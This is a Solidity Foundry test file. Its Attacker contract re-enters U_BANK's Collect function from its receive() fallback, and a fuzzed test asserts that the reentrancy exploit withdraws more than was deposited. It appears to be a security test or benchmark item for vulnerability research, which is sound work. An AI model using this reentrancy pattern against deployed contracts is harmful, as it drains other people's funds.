
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK} from "../src/U_BANK.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyU_BANK is Test {
    using stdStorage for StdStorage;
    
    U_BANK public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal <= type(uint128).max);
        
        uint256 unlockTime = block.timestamp - 100;
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal * 2, unlockTime);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    uint256 public storedUnlockTime;

    constructor(address victimAddress) { 
        victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 depositVal, uint256 unlockTime) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = depositVal / 2;
        storedUnlockTime = unlockTime;
        
        victim.Put{value: depositVal}(unlockTime);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        
        victim.Collect(val);
        
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
